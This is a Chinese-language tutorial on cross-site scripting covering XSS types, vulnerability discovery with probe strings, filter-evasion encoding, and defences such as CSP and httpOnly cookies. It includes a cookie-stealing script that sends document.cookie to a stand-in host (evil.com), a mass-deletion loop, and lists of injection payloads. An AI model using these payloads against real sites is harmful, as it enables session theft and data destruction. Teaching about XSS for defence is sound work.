# XSS 跨站脚本攻击

跨站脚本 Cross Site Scripting，简称为：CSS, 但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，跨站脚本攻击缩写为 XSS。

XSS 攻击通常发生在目标用户访问的目标网站上，当目标用户打开浏览器渲染目标网站 HTML 文档的过程中，出现了不被预期的恶意脚本指令，并且被执行时，攻击就发生了。攻击成功后，攻击者可能得到包括但不限于某些操作的权限、私密网页内容、会话和cookie等隐私数据。

## 理解 XSS 有三个关键点：

1. 战场

对于 XSS 来说，发起攻击的恶意脚本，或者说引发脚本执行的恶意链接存在于目标网页中，所以说 XSS 攻击发生的地方在目标用户的目标网站上。

2. 跨站

跨站脚本攻击中的“跨”，指的是发起 XSS 攻击的请求都是从目标网站到黑客预设的恶意网站中。利用的正是浏览器的跨域请求的特性，比如 `<link href > / <img src> / <script src> / background-image` 等元素属性或CSS样式，可以发起一个跨站的请求，链接一些外部资源。然后 XSS 攻击利用这一特性，通过直接植入一个恶意链接让用户点击，或者通过恶意脚本构造一个恶意请求，盗取用户的隐私数据。

> 相对应于 CSRF 跨站请求伪站中的“跨”，是从恶意网站中发起到目标网站的恶意请求。

```
  +------------+   XSS 跨站请求   +------------+
  |            +----------------->            |
  |  目标站点   |                 |  恶意站点   |
  |            <-----------------+            |
  +------------+   返回恶意脚本   +------------+


  +--------------------+      诱骗操作发起请求   +----------+
  |  伪装过的恶意站点    +-----------------------> 目标站点  |
  +--------------------+   携带目标站点的用户凭证 +-----------+

```

3. 脚本

XSS 跨站脚本攻击，重点不是“跨站”，而是“脚本”。“跨”实际上是属于浏览器的特性，而不是缺陷。任何安全问题都有“输入”的概念，很多时候开发网站时对表单输入内容长度都是有限制的，而想要盗取用户隐私数据的恶意的逻辑代码通常会比较长，要植入这段代码逻辑到目标网页中，只能利用浏览器发起“跨”域请求将恶意脚本资源请求到网页中执行来完成攻击。

所以说 **XSS 攻击的重点是，想尽一切办法将恶意脚本的内容在目标网站上被浏览器解析执行**。

## 示例

例子一：比如准备了下面这段盗取目标用户 cookie 信息的脚本

```js
// evil.js
new Image().src = "http://www.evil.com?data=" + escape(document.cookie)
```

然后准备一个链接 `http://www.target.com/detail/1#document.write("<script src=//www.evil.com/evil.js></script")`，发送给目标用户，并运用社工学欺骗用户点击，浏览器就会执行我们构造的恶意脚本，盗取用户的 cookie 数据发送到黑客的网站中。然后黑客可以利用和分析 cookie 数据执行其它恶意操作。

这仅仅是一个例子，其实情况不会这么直白和顺利。比如 chrome 浏览器会进行 XSS Filter 防御会使得此类攻击无效。还有即使盗取了 Cookie 也并不一定可以进一步控制目标用户账号的操作权限等。XSS 攻击的整个过程中，从漏洞的挖掘到漏洞的利用，再到进一步利用，各环节都需要看具体场景，比如如果浏览器存在 XSS Filter 防御，那我们的链接可以会进行特殊编码后再植入网页等手段。

例子二：假设目标网站 B 有一个删除文章的功能，在交互上是用户单击删除文章按钮，发起一个 Get www.b.com/blog/del?id=1 的请求。

```js
// evil.js
for (let i = 1; i < 1000; i++) {
  new Image().src = "http://www.b.com/blog/del?id=" + i
}
```

同样准备一个链接，然后诱骗用户访问目标网站 B 中存在 XSS 脚本漏洞的页面，将上述恶意本加载到本地浏览器执行，攻击发生，大量博客文章被删除。

如果不用这种方式，或者目标网站 B 中不存在 XSS 漏洞，则无法植入恶意链接发起恶意脚本请求。

通过以上两个例子，可以看出，**XSS 攻击的难点是如何进行 XSS 漏洞的挖掘和利用。**

## XSS 分类

XSS 有三类：反射型XSS（也叫非持久型XSS）、存储型XSS（也叫持久型XSS）、DOM XSS。

### 反射型 XSS

发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段 XSS 代码，最后浏览器解析执行。这个过程就像一次反射，所以称为反射型 XSS。

### 存储型 XSS

XSS 代码会通过请求提交到服务端，被存储在服务端，不管是数据库、服务器内存、文件系统等，待下次请求目标页面时响应到浏览器解析执行。因为提交的 XSS 代码被服务器保存了，所以称为了存储型 XSS。

区别反射型 XSS，存储型 XSS 随请求提交的方式不局限在 URL 的路径参数或查询参数，还可以在请求体中。

比如最典型的例子：留言板或网站的评论区，用户提交一条包含 XSS 代码的留言或评论，被存到了后端数据库。等到目标用户打开目标网页查看留言或评论时，页面的请求会将内容从数据库查询出来，响应给浏览器页面显示，XSS 代码被执行，就触发了 XSS 攻击。

### DOM XSS

DOM XSS 攻击区别于反射型 XSS 和存储型 XSS，它并不需要服务器直接参与，而是由浏览器直接解析 DOM 触发。

比如目标网站有 XSS 漏洞，解析了 URL 的 hash 片段。假设相关 js 逻辑类似下面代码, 获取 URL 的 hash 片段并执行：

```html
<script>
  eval(location.hash.substring(1))
</script>
```

那么触发的 XSS 方式是 `http://www.foo.com/comment.html#alert(1)`。这个 URL 的 # 后 hash 片段值 `alert(1)` 是不会发送到服务端的，完全由客户端浏览器解析执行。

## XSS 漏洞挖掘

在 XSS 造成的安全问题上，主要焦点在于“输入”和“输出”。

- 输入：攻击者在目标网站输入了攻击者可控的代码，比如会引用攻击脚本的链接等。
- 输出：目标用户请求访问目标网站某个目标网页时，输出了造成攻击的脚本内容。

所以 XSS 漏洞挖掘也是查找目标网站可被利用的“输入”和“输出”点。

### 探子请求

常见的一种挖掘思路叫做“探子请求”。

在漏洞挖掘阶段，在目标网站内试探性的发起一些“无害”请求，构造一个可知的随机字符串（一般是字母和数组组合）作为负载进行请求，然后在网页内容中去匹配这个随机字符串，如果能匹配到，即挖掘成功，这个随机字符串就称为“探子”。

### 反射型 XSS 挖掘

- 输入点：
  - 反射型 XSS 通常利用 URL 中 path 和 query 部分作为输入。
- 输出点：
  - HTML 标签之间，作为标签内容
  - HTML 标签之内，作为标签属性
  - javascript 脚本
  - css 属性值

示例：

以 query 的查询参数举例，一个页面的普通 URL：`http://www.foo.com/test?id=1`

攻击者会根据探子请求出现的输出点，构建下面这样的负载拼接到查询参数 `id=1` 后面，进行 XSS 测试。

```
<script>alert(1)</script>
'"><script>alert(1)</script>
</script><script>alert(1)//


<img src=@ onerror=alert(1) />
'"<img src=@ onerror=alert(1) />

' onmouseover=alert(1) x='
" onmouseover=alert(1) x="
` onmouseover=alert(1) x=`

alert(1)//
'";alert(1)
x:expression(alert(1))

javascript:alert(1)//
*/-->'"></iframe></script></style></title></textarea></xmp></noscript></noframes></plaintext><script>alert(1)</script>
```

#### HTML 标签之间

最普通的场景是出现在 `<div>输出位置</div>`，那么输入 `id=1<script>alert(1)</script>`就会触发 XSS。

但是在 HTML 中有些特殊标签之间是无法执行脚本的。

```
<title></title>
<textarea><textarea>
<iframe></iframe>
<noscript></noscript>
<noiframe></noiframe>
```

XSS 漏洞挖掘机制必须具备这些标签的区分能力，此时输入的代码可以提前闭合这些标签，再构建XSS执行脚本。比如输入点在 `<title></title>` 时，构造的输入可以是 `</title><script>alert(1)</script>`

另外两个特殊标签 `<script></script>` 和 `<style></style>` 具有特殊性，下面单独分析。

#### javascript 脚本内容中

script 标签的特殊性在于期内的代码可以直接被执行。比如有时候会将用户提交的值作为脚本代码的变量的值。如下

`<script>let a = "[输出位置]";...</script>`

此时构造的 XSS 输入，有多种选择：

- 闭合标签 `</script><script>alert(1)//`
- 闭合变量引用 `";alert(1)//`

#### CSS 属性值

现在在 style 标签中执行脚本只有 IE 浏览器支持，其它浏览器都禁止了，所以攻击效果不大。

在 IE 浏览器的 style 标签或 style 属性中注入 expression 关键词，并进行适当的闭合，就可以执行 XSS。

比如 style 属性的例子：`<a href="#" style="width:1;xss:expression(if(!window.x){alert(1);window.x=1;})">click me</a>`

#### HTML 标签之内

普通场景输出点在正常的标签属性中。比如 `<input type="text" value="[输出]" />`，此时有以下选择：

- 直接闭合属性 `" onmouseover=alert(1) x="`
- 闭合属性后又闭合标签 `"><script>alert(1)</script>`

如果遇到特殊的标签属性，则需要特殊处理。比如下面例子：

- `<input type="hidden" value="[输出]" />` 此时只能选择先闭合标签再输入XSS代码，不然的话会因为 hidden 属性无法触发。
- `<input value="[输入]" type="hidden" />` 仅仅顺序不同，可作的选择就不同了。此时可以输入 `" onmouseover=alert(1) type="text`，此时 `type="hidden"` 属性被 `type="text"` 属性覆盖，变成标签输入框，鼠标移上去就会触发 XSS。
- 输出点在 src/href/action 特殊属性内。比如`<a href="[输出]">click me</a>`，此时可以直接利用 javascript: 伪协议，构造输出 `javascript:alert(1)//`，大部分浏览器都支持，变成 `<a href="javascript:alert(1)//">click me</a>`
- 输出点在标签 on* 事件内。事件属性值内是可以执行脚本 。此时我们需要通过探子知道输出是作为整个 on* 事件值出现，还是以某个函数的参数值出现。不同的出现场景需要不同的闭合策略。比如 `<a href="#" onclick="[输出]" >click me</a>` 作为整个事件值出现，此时可以直接构造 `alert(1)` 即可。

### 存储型 XSS 挖掘

- 输入点：

  - 页面中的文本输入框，通常为 HTML 的表单提交。

- 输出点：
  - 表单提交后跳转的页面
  - 表单提交后未跳转，则可能为表单所在页面
  - 表单提交后不见了，则整个站点的页面都可能，需要整站查找。这种情况涉及到站点的多页面，可以利用爬虫技术爬取整站页面进行分析。

举例：比如在输入点的表单中提交一个特定的探子 ”d0mx55"，根据表单提交后跳转情况，判断页面中探子出现的位置。可以在跳转后的页面中打开控制台，输入检测脚本

```js
if (document.documentElement.innerHTML.indexOf("d0mx55") != -1) {
  alert("found dom xss")
}
```

然后在根据探子所在的位置，跟上述 HTML 标签内或属性内描述的方法进行 XSS 测试。

### DOM XSS 挖掘

DOM XSS 通常利用 URL 的 hash 属性构造输入。因为 hash 片段值不会发送到服务器，由浏览器自行解析处理。

常见的输入构造和输入点位置如下：

- 输入点

```
document.URL
document.URLUnencoded
document.referrer
document.cookie
document.location 以及相关的 location 对象的属性
window.location 以及相关的 location 对象的属性
window.name
```

- 输出点

```
1.直接输入 HTML 内容
document.write(...)
document.body.innerHTml = ...

2.直接修改 DOM 树
document.forms[0].action =
document.attachEvent(...)
document.create()
document.execCommand()
document.body
window.attachEvent()

3.替换 URL
document.location = 或者相关属性，如 document.location.href host hostname 等
document.location.replace(...)
document.location.assign(...)
document.URL = ...
window.navigate(...)

4.打开或修改窗口
document.open(...)
window.open(...)
window.location.href = ...

5.直接执行脚本
eval(...)
window.execScript(...)
window.setInterval(...)
window.setTimeout(...)
```

所以 DOM XSS 的挖掘思路有两种：

- 静态方法
- 动态方法

#### 静态方法

静态方法是使用正则表达式来匹配页面输入点和输出点是否含上述有特定代码。

- 输入点匹配正则

```js
let inputReg =
  /(location\s*[\[.])|([.\[]\s*["']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/
```

- 输出点匹配正则

```js
let outputReg = /((src|href|data|location|code|value|action)\s*["'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*["'\])*\s*\()/
```

#### 动态方法

构造探子通过输入点输入，然后在渲染后的页面中查找探子。

比如页面地址中输入 `http://www.foo.com#document.write('d0m' + 'x55')`，如果页面顺利打开，后续检测判断页面中是否存在这个探子即可。

```js
if (document.documentElement.innerHTML.indexOf("d0mx55") != -1) {
  alert("found dom xss")
}
```

## 编码混淆

上面所讲的所有 XSS 构造的输入，都是非常直白，这是便于大家学习。在实际漏洞挖掘中，通常不会这样直白和随心所欲的注入代码，比如浏览器默认的 XSS Filter 过滤机制，或者浏览器自身解析规则等都会阻止可预知风险的危险代码的执行。

为了提高漏洞挖掘的成功率，通常需要对注入的代码进行混淆，以绕过过滤机制或阻拦规则。这里所说的混淆代码，不是通常意义里在程序构建时的代码混淆，而是利用浏览器自身的编码和自解码特性对代码进行编码，然后浏览器解析时会自动解码执行。

### 浏览器 XSS Filter 机制

目前主要是 IE 和 Chrome 浏览器有 XSS Filter 机制，它主要针对反射型 XSS 攻击，大体上采用都是一种启发式的检测，根据用户提交的参数判断是否是潜在的 XSS 特征，并重新渲染响应内容保证潜在的 XSS 特征不会触发。在历史上，它们被绕过很多次，同时也越来越完善。

> 《Web 前端黑客技术揭秘》P165

### 浏览器的编码

> 《Web 前端黑客技术揭秘》P138 和 P169

目前浏览器的自解码机制包括：

- HTML 编码
  - 十进制编码：形式：`&#D; `，用 `&#` 作为前缀，中间为十进制数字，使用半角符号 `;` 作为后缀，后缀也可以省略。如 `&#65` 表示字符 A
  - 十六进制编码：形式：`&#xH;` 用 `&#x` 作为前缀，比十进制多了 `x`，中间为十六进制 0-9a-f 表示，大小写不敏感。同样使用半角符号 `;` 作为后缀，也可以省略。如 `&#x5a`
  - 实体编码：在 HTML 中，某此字符是预留的，所以如果要显示这些预留字符，需要使用该字符的实体编码形式。比如 HTML 中的 `<` 实体编码为 `&lt;`， `>` 实体编码为 `&gt;`。还有比如浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。如需在页面中显示准确数量的空格，需要使用空格的 `&nbsp;` 实体编码。
- javascript 编码
  - Unicode 形式：`\uHex` 以 `\u` 开头的十六进制编码
  - 普通的十六进制：`\xHex`
  - 特殊符号的转义编码：在特殊字符前加 `\` 进行转义，比如 `\<`，`\>`等。
- URL 编码 urlencoded

实现：

- 字符为对应的进制编码：`char.charCodeAt().toString(radix)`，比如 `'a'.charCodeAt().toString(10) === '97'`
- 进制编码转为对应的字符：`String.fromCharCode(parseInt(number, radix))`，比如`String.fromCharCode(parseInt('97', 10)) === 'a'`
- 实体编码是固定的，具体见[HTML 实体符号](https://www.runoob.com/tags/ref-entities.html)
- URL 编码实现：
  - `escape/unescape` 已经从 web 标准中移除，虽然一些浏览器仍然支持它，但不再推荐使用该方法，建议用以下方法替换。该方法不编码的字符有 69 个。
  - `encodeURI/decodeURI` 不编码的字符有82个。包括 `0-9`、`a-z`、`A-Z`、`-_.!~*'()`、`#;,/?:@&=+$`
  - `encodeURIComponent / decodeURIComponent` 不编码的字符有71个。包括`0-9`、`a-z`、`A-Z`、`-_.!~*'()`

```js
var set1 = ";,/?:@&=+$" // 保留字符
var set2 = "-_.!~*'()" // 不转义字符
var set3 = "#" // 数字标志
var set4 = "ABC abc 123" // 字母数字字符和空格

console.log(encodeURI(set1)) // ;,/?:@&=+$
console.log(encodeURI(set2)) // -_.!~*'()
console.log(encodeURI(set3)) // #
console.log(encodeURI(set4)) // ABC%20abc%20123 (空格被编码为 %20)

console.log(encodeURIComponent(set1)) // %3B%2C%2F%3F%3A%40%26%3D%2B%24
console.log(encodeURIComponent(set2)) // -_.!~*'()
console.log(encodeURIComponent(set3)) // %23
console.log(encodeURIComponent(set4)) // ABC%20abc%20123 (空格被编码为 %20)
```

所以对于整个 url 的编码需要使用 encodeURIComponent/decodeURIComponent 进行编码，因为 `#&=`在 uri 中都是特殊的字符，需要被编码掉。

实际对 xss 执行代码进行编码混淆时可以直接在某些编码网站进行，省掉自己实现。比如 [https://www.monyer.com/demo/monyerjs/](https://www.monyer.com/demo/monyerjs/)

HTML DOM 的进制编码和 script 中的 js 代码的进制编码的区别

假设我们想植入的目标代码是：

```html
<input
  id="exec_btn"
  type="button"
  value="exec"
  onclick="document.write('<img src=@ onerror=alert(123) />')"
/>
```

为了避开一些 XSS Filter ，进行实体编码后的样子为

```html
<input
  id="exec_btn"
  type="button"
  value="exec"
  onclick="document.write('&lt;img src=@ onerror=alert(123) /&gt;')"
/>
```

当点击按钮后，浏览器进行 HTML 自解码后，显示 DOM 显示的仍然是 `<img src=@ onerror=alert(123) />`。但在输入阶段利用编码可以避开一些防御的正则匹配规则。

但如果将在上述代码，在 script 上下文中植入的话，比如像下面这样：

```html
<input type="button" id="exec_btn" value="exec" />

<script>
  const inputEl = document.getElementById("exec_btn")
  inputEl.onclick = function () {
    document.write("&lt;img src=@ onerror=alert(123) /&gt;")
  }
</script>
```

点击并不会成功，因为在 javascript 中可识别的编码形式与 HTML 的编码并不统一。需要改成如下方式：

```html
<input type="button" id="exec_btn" value="exec" />

<script>
  const inputEl = document.getElementById("exec_btn")
  inputEl.onclick = function () {
    document.write("\<img src\=@ onerror=alert\(123\) \/\>;")
  }
</script>
```

### 混淆实例

> TODO 《Web 前端黑客技术揭秘》P178

## XSS 漏洞利用

> TODO 《Web 前端黑客技术揭秘》P206

## XSS 防御

### X-XSS-Protection

有三个值：

- 0，表示禁用这个策略
- 1，默认值，对危险脚本做一些标志或修改，以阻止它在浏览器上渲染执行。
- `1;mode=black`，强制不渲染，在 Chrome 浏览器中直接跳转到空白页，在 IE 下返回一个 # 符号。

这个策略在浏览器中支持良好，不过这个策略仅针对反射型 XSS，有向部分 DOM XSS 防御改进的趋势，但这个策略对付不了存储型 XSS。它能识别出反射型 XSS 是因为在浏览器提交请求的 URL 参数中带有可疑的 XSS 代码片段，浏览器通过大量正则匹配到时，就会触发对应的防御机制，在响应时，如果发现这段可疑的 XSS 代码进入 DOM 中，相关防御机制就会生效。

但对于存储型 XSS，不可能出现这样的过程，浏览器无法从服务器存储输出到浏览器前端的 JS 代码是合法还是非法的。

### CSP （Content-Security-Policy）内容安全策略

XSS 攻击利用了浏览器对于从服务器所获取内容的信任，加载恶意脚本在浏览器打开的目标网站中执行。浏览器初始设定是信任其内容来源，即使有些请求链接过来的脚本并非来自于同域站点。

而 CSP 通过可加载的链接来源，即只执行当前策略设定的可信任来源的脚本链接，有效的减少或消除 XSS 攻击所依赖的链接载体。设定合理的 CSP 策略，浏览器只执行从白名单站点获取到的脚本文件，而忽略其它非法站点加载的脚本，包括内联脚本和HTML事件处理属性。

启用 CSP ，可以通过以下三种方式：

1. 服务端返回 `Content-Security-Policy` 响应头字段，这是被推荐的主流方式。
2. 有时也会看到 `X-Content-Security-Policy` 头字段，这是旧版本，现在浏览器以上面第一种头字段为准。
3. 也可以使用 meta 元素指定，`<meta http-equiv="Content-Security-Policy" content=default-src 'self' />`，但是某些 CSP 功能，比如发送 CSP 违规报告的配置 report-uri 不能使用，只能在头字段配置。

CSP 策略由一些指令构成，每个指令以分号 `;` 分隔，语法：`Content-Security-Policy: <policy-directive>; <policy-directive>`，其中 `policy-directive` 的形式为 `directive <source> <source> ...`

目前可设置的指令不断增多和完善，具体可以查看 [MDN Content-Security-Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy)

常见为 directive 指令有：

- 资源获取指令 fetch directive
  - default-src：为其他取指令提供备用服务。
  - connect-src：限制能通过脚本接口加载的 URL。
  - font-src：设置允许通过 @font-face 加载的字体源地址。
  - frame-src：设置允许通过类似 `<iframe>` 标签加载的内嵌内容的源地址。
  - img-src：限制图片和图标的源地址。
  - manifest-src：限制应用声明文件的源地址。
  - media-src：限制通过 `<audio>`、`<video>` 或 `<track>` 标签加载的媒体文件的源地址。
  - object-src：限制 `<object>` 或 `<embed>` 标签的源地址。
  - prefetch-src: 指定预加载或预渲染的允许源地址。
  - script-src: 限制 JavaScript 的源地址。
  - style-src: 限制层叠样式表文件源。
  - worker-src: 限制 Worker、SharedWorker 或 ServiceWorker 脚本源。
- 文档指令 document directive
  - base-uri 限制在 DOM 中 `<base>` 元素可以使用的 URL。
- 导航指令 navigation directive
  - form-action 限制能被用来作为给定上下文的表单提交的目标 URL（说白了，就是限制 form 的 action 属性的链接地址）
  - frame-ancestors 指定可能嵌入页面的有效父项 `<frame>、<iframe>、<object> 或 <embed>`。
- 其它指令
  - block-all-mixed-content 当使用 HTTPS 加载页面时阻止使用 HTTP 加载任何资源。
- 其它相关的头字段
  - [Content-Security-Policy-Report-Only](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 替代了报告指令 report-uri，将违反 CSP 策略的报告发送到指定的地址。
  - [Referrer-Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy) 替代了指令 referrer，用来指定会离开当前页面的跳转链接的 referer header 信息。

常见的 source 可设置的值有：[sources](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources)

- `*` 表示任务来源
- `*.foo.com` 表示来源于 foo.com 子域内容
- `https://foo.com` 表示来源于 https 协议下的 foo.com 域内容
- `none` 表示外部资源不被允许加载
- `self` 表示只有同域内的资源允许加载
- `unsafe-inline` 表示允许内嵌的 js/css，如 script标签， javascript:协议的，on事件里的，style 标签的资源。
- `data` 表示允许 `data:URI` 资源
- `blob` 表示允许 `blob:URI` 资源

示例

```
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src foo.example.com

上述内容策略表示，各种内容默认仅允许从同域站点获取，但存在如下例外：
- 图片可以从任何地方加载 (注意“*”通配符)。
- 多媒体文件仅允许从 media1.com 和 media2.com 加载（不允许从这些站点的子域名）。
- 脚本仅允许来自于 foo.example.com。
```

### 其它防御措施

- 域分离，将一些可能带来风险的链接，点击跳转到另一个域的页面进行中转，减少主域的风险。比如掘金文章页面如果有链接外域，会统一处理把外域链接引到一个专门的中转页面进行二次确认跳转。 `https://link.juejin.cn/?target=https%3A%2F%2Fblog.stackblitz.com%2Fposts%2Fwhat-is-vite-introduction`。
- 启用 HTTPS 传输
- 设置严格安全的 COOKIE，比如设置 httpOnly 和 Secure 属性
- 加入验证码
- 服务端对页面内的所有输入假定是有害的，对输入进行严格校验，比如值的长度限制、类型限制、特殊符号限制（特别是相关的HTML特殊符号 `<>"` 等）。对响应输出的数据进行相应编码，输出的原则就是该数据不会超出自己所在的区域，不会当做指令执行。
